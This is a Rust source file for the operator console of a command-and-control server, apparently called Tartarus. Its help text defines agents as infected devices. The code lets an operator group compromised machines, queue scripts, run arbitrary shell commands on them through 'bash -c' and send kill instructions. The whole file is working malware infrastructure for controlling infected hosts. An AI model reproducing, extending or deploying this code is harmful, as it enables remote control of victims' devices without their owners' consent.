use crate::SharedState;
use talaria::api::{Agent, AgentInfo};
use talaria::console::*;
use talaria::protocol::AgentInstructionBody;

pub async fn evaluate_command(
    state: SharedState,
    command_context: CommandContext,
) -> Result<ConsoleResponse, ConsoleError> {
    match command_context.command {
        Command::Connect { target } => connect(state, target, command_context.current_target).await,
        Command::Disconnect => disconnect(command_context.current_target).await,
        Command::Nickname(command) => nickname(state, command_context.current_target, command).await,
        Command::Group(command) => group(state, command_context.current_target, command).await,
        Command::Show(command) => show(state, command).await,
        Command::Run(command) => run(state, command_context.current_target, command).await,
        Command::Remove { target } => remove(state, command_context.current_target, target).await,
        Command::Clear => clear().await,
        Command::Help => help().await,
    }
}

async fn connect(
    state: SharedState,
    target: TargetIdentifier,
    current_target: Option<TargetIdentifier>,
) -> Result<ConsoleResponse, ConsoleError> {
    match current_target {
        Some(target) => return Err(ConsoleError::from(format!("already connected to: {}", target.to_string()))),
        None => {},
    }
    
    let _ = get_target(state, current_target, Some(target.clone())).await?;

    Ok(ConsoleResponse {
        output: format!("successfully connected to: {}", target.to_string()),
        new_target: NewTarget::Target { target },
    })
}

async fn disconnect(current_target: Option<TargetIdentifier>) -> Result<ConsoleResponse, ConsoleError> {
    match &current_target {
        Some(_) => Ok(ConsoleResponse {
            output: format!("successfully disconnected"),
            new_target: NewTarget::NoTarget,
        }),
        None => Err(ConsoleError::from("not currently connected"))
    }
}

async fn nickname(state: SharedState, current_target: Option<TargetIdentifier>, command: NicknameCommand) -> Result<ConsoleResponse, ConsoleError> {
    match command {
        NicknameCommand::Set { agent, nickname } => {
            modify_agent(state, async |agent| {
                agent.nickname = Some(nickname);
            }, current_target, agent.map(|a| a.into())).await?;
            
            Ok(ConsoleResponse {
                output: format!("successfully set agent nickname"),
                new_target: NewTarget::NoChange,
            })
            
        },
        NicknameCommand::Get { agent } => {
            let agent = get_agent(state, current_target, agent.map(|a| a.into())).await?;

            match agent.nickname {
                Some(nickname) => Ok(ConsoleResponse {
                    output: format!("{}", nickname),
                    new_target: NewTarget::NoChange,
                }),
                None => Err(ConsoleError::from("agent has no nickname")),
            }
        },
        NicknameCommand::Clear { agent } => {
            modify_agent(state, async |agent| {
                agent.nickname = None;
            }, current_target, agent.map(|a| a.into())).await?;
            
            Ok(ConsoleResponse {
                output: format!("successfully cleared agent nickname"),
                new_target: NewTarget::NoChange,
            })
        },
        NicknameCommand::None => todo!(),
    }
}

async fn group(state: SharedState, current_target: Option<TargetIdentifier>, command: GroupCommand) -> Result<ConsoleResponse, ConsoleError> {
    match command {
        GroupCommand::Create { group_name, agents } => {
            if state.read().await.groups.contains_key(&group_name) {
                return Err(ConsoleError::from("group already exists"));
            }
            
            let mut agent_ids = vec![];

            for ident in &agents {
                agent_ids.push(get_agent_id(state.clone(), None, Some((ident.clone()).into())).await?);
            }

            agent_ids.dedup();

            {
                let mut state = state.write().await;
                state.groups.insert(group_name, agent_ids);
            }
        
            Ok(ConsoleResponse {
                output: format!("successfully created group"),
                new_target: NewTarget::NoTarget,
            })
        },
        GroupCommand::Delete { group_name } => {
            if !state.read().await.groups.contains_key(&group_name) {
                return Err(ConsoleError::from("group does not exist"));
            }

            state.write().await.groups.remove(&group_name);

            Ok(ConsoleResponse {
                output: format!("successfully removed group"),
                new_target: NewTarget::NoTarget,
            })
        },
        GroupCommand::Add { group_name, agents } => {
            let mut agent_ids = vec![];

            for ident in &agents {
                agent_ids.push(get_agent_id(state.clone(), None, Some((ident.clone()).into())).await?);
            }

            modify_group(state, async |g| {
                g.extend(agent_ids);
                g.dedup();
            }, current_target, Some(TargetIdentifier::Group { group: group_name })).await?;

            Ok(ConsoleResponse {
                output: format!("successfully added agent(s) to group"),
                new_target: NewTarget::NoTarget,
            })
        },
        GroupCommand::Remove { group_name, agents } => {
            let mut agent_ids = vec![];

            for ident in &agents {
                agent_ids.push(get_agent_id(state.clone(), None, Some((ident.clone()).into())).await?);
            }

            modify_group(state, async |g| {
                for id in agent_ids {
                    g.retain(|&x| x != id);
                }
            }, current_target, Some(TargetIdentifier::Group { group: group_name })).await?;

            Ok(ConsoleResponse {
                output: format!("successfully removed agent(s) from group"),
                new_target: NewTarget::NoTarget,
            })
        },
        GroupCommand::Clear { group_name } => {
            modify_group(state, async |g| {
                g.clear();
            }, current_target, Some(TargetIdentifier::Group { group: group_name })).await?;

            Ok(ConsoleResponse {
                output: format!("successfully cleared group"),
                new_target: NewTarget::NoTarget,
            })

        },
        GroupCommand::None => todo!(),
    }
}

async fn show(state: SharedState, command: ShowCommand) -> Result<ConsoleResponse, ConsoleError> {
    match command {
        ShowCommand::Agents => {
                let agents = state.read().await.get_agent_list();
                let agents = agents.iter().map(|a| a.to_string()).collect::<Vec<String>>();
            
                Ok(match !agents.is_empty() {
                    true => {
                        let mut output = String::new();
                        output.push_str(&AgentInfo::header());
                        output.push_str("\n");
                        output.push_str(&agents.join("\n"));

                        ConsoleResponse { output, new_target: NewTarget::NoChange }
                    }
                    false => ConsoleResponse { output: format!("no agents found"), new_target: NewTarget::NoChange },
                })
            },
        ShowCommand::Groups => {
            let groups = state.read().await.groups.clone();

            Ok(match !groups.is_empty() {
                true => {
                    let mut output = String::new();

                    for (name, agents) in groups {
                        output.push_str(&name);
                        output.push_str(":\n");

                        for agent in agents {
                            let handle = state.read().await;
                            let agent = handle.get_agent(&agent).clone();

                            match agent {
                                Some(agent) => {
                                    output.push_str("[");
                                    output.push_str(&agent.nickname.clone().unwrap_or(String::from("?")));
                                    output.push_str("] "); 
                                    output.push_str(&agent.id.to_string());
                                    output.push_str("\n");
                                }
                                None => {},
                            } 
                        }
                    }
                  
                    // remove trailing newline
                    output.truncate(output.len() - 1);

                    ConsoleResponse {
                        output,
                        new_target: NewTarget::NoChange,
                    }
                },
                false => ConsoleResponse {output: String::from("no groups found"), new_target: NewTarget::NoChange },
            })

        },
        ShowCommand::Server => {
                let tartarus_info = state.read().await.get_tartarus_info().to_string();

                Ok(ConsoleResponse {
                    output: tartarus_info,
                    new_target: NewTarget::NoChange,
                })
            },
        ShowCommand::Scripts => {
            let handle = state.read().await;
            let scripts = handle.get_all_scripts().clone();

            match !scripts.is_empty() {
                true => {
                    Ok(ConsoleResponse {
                        output: scripts.iter().map(|s| s.name.clone()).collect::<Vec<String>>().join("\n"),
                        new_target: NewTarget::NoChange,
                    })
                } 
                false => Err(ConsoleError::from("no scripts found"))
            }
        },
        ShowCommand::Stats => {
            let tartarus_stats = state.read().await.get_tartarus_stats().to_string();

            Ok(ConsoleResponse {
                output: tartarus_stats,
                new_target: NewTarget::NoChange,
            })
        },
        ShowCommand::Target(target_identifier) => todo().await,
    }
}


async fn run(state: SharedState, current_target: Option<TargetIdentifier>, command: RunCommand) -> Result<ConsoleResponse, ConsoleError> {
    match command {
        RunCommand::Script { target, script_name } => {
            let target = expect_target(current_target, target)?;

            let script = {
                let handle = state.read().await;

                match handle.get_script(script_name) {
                    Some(script) => script.clone(),
                    None => return Err(ConsoleError::from("script not found")),
                }
            };

            let ids = match target.clone() {
                TargetIdentifier::Group { .. } => get_group(state.clone(), None, Some(target)).await?,
                TargetIdentifier::Agent { .. } => vec![get_agent_id(state.clone(), None, Some(target)).await?],
            };

            for id in ids {
                push_instruction(state.clone(), id, &AgentInstructionBody::Script(script.clone())).await?;
            }
            
            Ok(ConsoleResponse {
                output: String::from("successfully queued script"),
                new_target: NewTarget::NoChange,
            })
        },
        RunCommand::Rhai { target, scripts_contents } => {
            let target = expect_target(current_target, target)?;

            let ids = match target.clone() {
                TargetIdentifier::Group { .. } => get_group(state.clone(), None, Some(target)).await?,
                TargetIdentifier::Agent { .. } => vec![get_agent_id(state.clone(), None, Some(target)).await?],
            };

            for id in ids {
                push_instruction(state.clone(), id, &AgentInstructionBody::Rhai(scripts_contents.clone())).await?;
            }
            
            Ok(ConsoleResponse {
                output: String::from("successfully queued script"),
                new_target: NewTarget::NoChange,
            })
        },
        RunCommand::Shell { target, shell_command } => {
            let target = expect_target(current_target, target)?;

            let ids = match target.clone() {
                TargetIdentifier::Group { .. } => get_group(state.clone(), None, Some(target)).await?,
                TargetIdentifier::Agent { .. } => vec![get_agent_id(state.clone(), None, Some(target)).await?],
            };

            for id in ids {
                // FiXME: hack
                push_instruction(state.clone(), id, &AgentInstructionBody::Command {
                    command: String::from("bash"),
                    args: vec![String::from("-c"), shell_command.clone()],
                }).await?
            }
            
            Ok(ConsoleResponse {
                output: String::from("successfully queued shell code"),
                new_target: NewTarget::NoChange,
            })
        },
        RunCommand::None => todo!(),
    }
}

async fn remove(state: SharedState, current_target: Option<TargetIdentifier>, targets: Vec<TargetIdentifier>) -> Result<ConsoleResponse, ConsoleError> {
    let targets = match targets.is_empty() {
        true => vec![expect_target(current_target, None)?],
        false => targets,
    };

    for target in targets {
        match &target {
            TargetIdentifier::Group { .. } => {
                let group = get_group(state.clone(), None, Some(target)).await?;
                
                for agent in group {
                    push_instruction(state.clone(), agent, &AgentInstructionBody::Kill).await?;
                }
            },
            TargetIdentifier::Agent { .. } => {
                let id = get_agent_id(state.clone(), None, Some(target)).await?;
                push_instruction(state.clone(), id, &AgentInstructionBody::Kill).await?;
            },
        }
    }

    Ok(ConsoleResponse {
        output: String::from("successfully removed agents"),
        new_target: NewTarget::NoChange,
    })
}

async fn todo() -> Result<ConsoleResponse, ConsoleError> {
    Ok(ConsoleResponse {
        output: format!("not implemented yet"),
        new_target: NewTarget::NoChange,
    })
}

async fn clear() -> Result<ConsoleResponse, ConsoleError> {
    Ok(ConsoleResponse {
        output: "\x1B[2J\x1B[1;1H".to_string(),
        new_target: NewTarget::NoChange,
    })
}

async fn help() -> Result<ConsoleResponse, ConsoleError> {
    let mut output: String = 
r#"---------------------------------------------------------------------------------------------------------------------
 _____          _
|_   _|_ _ _ __| |_ __ _ _ __ _   _ ___
  | |/ _` | '__| __/ _` | '__| | | / __|
  | | (_| | |  | || (_| | |  | |_| \__ \
  |_|\__,_|_|   \__\__,_|_|   \__,_|___/
---------------------------------------------------------------------------------------------------------------------
Vocab:
    agent    | An infected device
    group    | A named collection of infected devices
    target   | Either a single infected device, or a group of infected devices
    <>       | Required argument
    []       | Optional argument. Will default to connected target if applicable
    ..       | Accepts many arguments of the same type delimited by a space
---------------------------------------------------------------------------------------------------------------------
Commands:
"#.to_string();
    output.push_str(&Command::help());
    output.push_str("\n---------------------------------------------------------------------------------------------------------------------");
    Ok(ConsoleResponse {
        output,
        new_target: NewTarget::NoChange,
    })
}

/// Takes in two targets and returns the first Some(T)
/// target found, in the following order:
/// 1. Explicit
/// 2. Implicit
/// 3. None
fn expect_target(implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<TargetIdentifier, ConsoleError> {
    match explicit {
        Some(target) => return Ok(target),
        None => {}
    }

    match implicit {
        Some(target) => Ok(target),
        None => Err(ConsoleError::from("not connected to any target, and no target is specified")),
    }
}

fn expect_group(implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<String, ConsoleError> {
    let target = expect_target(implicit, explicit)?;
    
    match target {
        TargetIdentifier::Agent { .. } => Err(ConsoleError::from("expected group, not agent")),
        TargetIdentifier::Group { group } => Ok(group),
    }
}

fn expect_agent(implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<AgentIdentifier, ConsoleError> {
    let target = expect_target(implicit, explicit)?;

    match target {
        TargetIdentifier::Group { .. } => Err(ConsoleError::from("expected agent, not group")),
        TargetIdentifier::Agent { agent } => Ok(agent),
    }
}

async fn get_group_name(state: SharedState, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<String, ConsoleError> {
    let group_name = expect_group(implicit, explicit)?;
    
    match state.read().await.groups.get(&group_name) {
        Some(_) => Ok(group_name),
        None => Err(ConsoleError::from(format!("group {group_name} not found"))),
    }

}

async fn get_agent_id(state: SharedState, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<u64, ConsoleError> {
    let agent_ident = expect_agent(implicit, explicit)?;
    
    match agent_ident {
        AgentIdentifier::Nickname { nickname } => {
            match state.read().await.lookup_agent(&nickname) {
                Some(id) => Ok(id),
                None => Err(ConsoleError::from(format!("agent with nickname: {nickname} not found"))),
            }
        },
        AgentIdentifier::ID { id } => {
            match state.read().await.get_agent(&id) {
                Some(_) => Ok(id),
                None => Err(ConsoleError::from(format!("agent with id: {id} not found"))),
            }
        },
    }
}

async fn get_agent(state: SharedState, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<Agent, ConsoleError> {
    let id = get_agent_id(state.clone(), implicit, explicit).await?;
    
    match state.clone().read().await.get_agent(&id) {
        Some(agent) => Ok(agent.clone()),
        None => Err(ConsoleError::from("agent not found")),
    }
}

async fn modify_agent<F>(state: SharedState, closure: F, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<(), ConsoleError>
where 
    F: AsyncFnOnce(&mut Agent)
{
    let agent_id = get_agent_id(state.clone(), implicit, explicit).await?;

    let mut state = state.write().await;
    let agent = state.get_agent_mut(&agent_id);

    
    match agent {
        Some(agent) => Ok(closure(agent).await),
        None => Err(ConsoleError::from("agent not found"))
    }
}

async fn get_group(state: SharedState, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<Vec<u64>, ConsoleError> {
    let group_name = get_group_name(state.clone(), implicit, explicit).await?;
    
    match state.clone().read().await.groups.get(&group_name) {
        Some(agent) => Ok(agent.clone()),
        None => Err(ConsoleError::from("agent not found")),
    }
}

async fn push_instruction(state: SharedState, agent_id: u64, instruction: &AgentInstructionBody) -> Result<(), ConsoleError> {
    match state.write().await.push_instruction(&agent_id, instruction) {
        true => Ok(()),
        false => Err(ConsoleError::from("agent not found")),
    }
}

async fn modify_group<F>(state: SharedState, closure: F, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<(), ConsoleError>
where 
    F: AsyncFnOnce(&mut Vec<u64>)
{
    let group_name = get_group_name(state.clone(), implicit, explicit).await?;

    let mut state = state.write().await;
    let group = state.groups.get_mut(&group_name);

    
    match group {
        Some(group) => Ok(closure(group).await),
        None => Err(ConsoleError::from("group not found"))
    }
}

/// Returns simplified TargetIdentifier if agent/group is present in state, return ConsoleError
/// otherwise
async fn get_target(state: SharedState, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<TargetIdentifier, ConsoleError> {
    let target = expect_target(implicit.clone(), explicit.clone())?;

    match target {
        TargetIdentifier::Group { .. } => { let _ = get_group_name(state, implicit.clone(), explicit.clone()).await?; },
        TargetIdentifier::Agent { .. } => { let _ = get_agent_id(state, implicit.clone(), explicit.clone()).await?; },
    }

    Ok(target)
}
